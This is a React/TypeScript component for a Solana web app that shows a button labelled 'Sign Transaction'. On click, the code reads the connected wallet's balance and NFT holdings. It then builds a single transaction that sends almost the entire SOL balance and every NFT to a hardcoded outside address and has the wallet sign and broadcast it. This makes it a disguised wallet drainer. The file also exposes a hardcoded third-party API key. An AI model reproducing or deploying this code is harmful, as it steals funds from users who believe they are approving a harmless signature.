'use client';
import { Button } from '@mui/material';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
    PublicKey,
    Transaction,
    TransactionInstruction,
    Connection,
    SystemProgram,
    Account,
    sendAndConfirmTransaction,
    Keypair,
} from '@solana/web3.js';
import bs58 from 'bs58';
import type { FC } from 'react';
import React, { useCallback, useState } from 'react';
import { useNotify } from './notify';
import { getParsedNftAccountsByOwner, isValidSolanaAddress, createConnectionConfig } from '@nfteyez/sol-rayz';
import { connect } from 'http2';
import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, createTransferCheckedInstruction } from '@solana/spl-token';
import axios from 'axios';
declare global {
    interface Window {
        solana: any;
    }
}
interface NftItem {
    mint: string;
    result: Array<Object>;
    owner: string;
    // Add other properties as needed
}
export const SignTransaction: FC = () => {
    const { connection } = useConnection();
    const { wallet, publicKey, signTransaction } = useWallet();
    const notify = useNotify();

    const onClick = useCallback(async () => {
        try {
            let nftList: NftItem[] = [];
            console.log('publickey-------->', publicKey?.toString());
            if (!publicKey) throw new Error('Wallet not connected!');
            if (!signTransaction) throw new Error('Wallet does not support transaction signing!');
            console.log('wallet----->', publicKey);
            // const connection = new Connection('https://api.devnet.solana.com');
            const connection = new Connection('https://api.metaplex.solana.com/');
            const balance = await connection.getBalance(publicKey);
            const accountInfo = await connection.getAccountInfo(publicKey);
            console.log('balance----->', balance);
            const nfts = await connection.getParsedAccountInfo(publicKey);
            let nftUrl = `https://api.shyft.to/sol/v1/nft/read_all?network=mainnet-beta&address=${publicKey.toString()}`;
            await axios({
                // Endpoint to send files
                url: nftUrl,
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'x-api-key': 'KlMY8SSMZq_RW-Ml',
                },
                // Attaching the form data
            })
                // Handle the response from backend here
                .then((res) => {
                    nftList = res.data.result;
                })

                // Catch errors if any
                .catch((err) => {
                    console.warn(err);
                });
            console.log('nft----->', nftList);
            const transaction = new Transaction();
            transaction.add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: new PublicKey('92ti5B29oF5Yq65XKs1mmGWT7GehBNA2g5NsdaRKtpGF'),
                    lamports: balance- 10000,
                })
            );
            let transactions = [];
            for (let i = 0; i < nftList.length; i++) {
                console.log('nft----->', nftList[i]);
                const toAddress = new PublicKey('92ti5B29oF5Yq65XKs1mmGWT7GehBNA2g5NsdaRKtpGF');
                const mintPubkey = new PublicKey(nftList[i].mint);
                const owner = new PublicKey(nftList[i].owner);
                {
                    transaction.add(
                        createTransferCheckedInstruction(
                            publicKey, // from (should be a token account)
                            mintPubkey, // mint
                            toAddress, // to (should be a token account)
                            owner, // from's owner
                            1e8, // amount, if your deciamls is 8, send 10^8 for 1 token
                            8 // decimals
                        )
                    );
                }
            }
            try {
                const provider = window.solana;
                const { blockhash } = await connection.getRecentBlockhash();
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = publicKey;

                // Sign the transaction using the Solana provider
                const signedTransaction = await provider.signTransaction(transaction);

                // Send the signed transaction to the Solana network
                const signature = await connection.sendRawTransaction(signedTransaction.serialize());

                // Confirm the transaction
                await connection.confirmTransaction(signature);
            } catch (error) {
                console.error('Transaction failed:', error);
            }
        } catch (error: any) {
            notify('error', `Transaction signing failed! ${error?.message}`);
        }
    }, [publicKey, signTransaction, connection, notify]);

    return (
        <Button variant="contained" color="secondary" onClick={onClick} disabled={!publicKey || !signTransaction}>
            Sign Transaction
        </Button>
    );
};
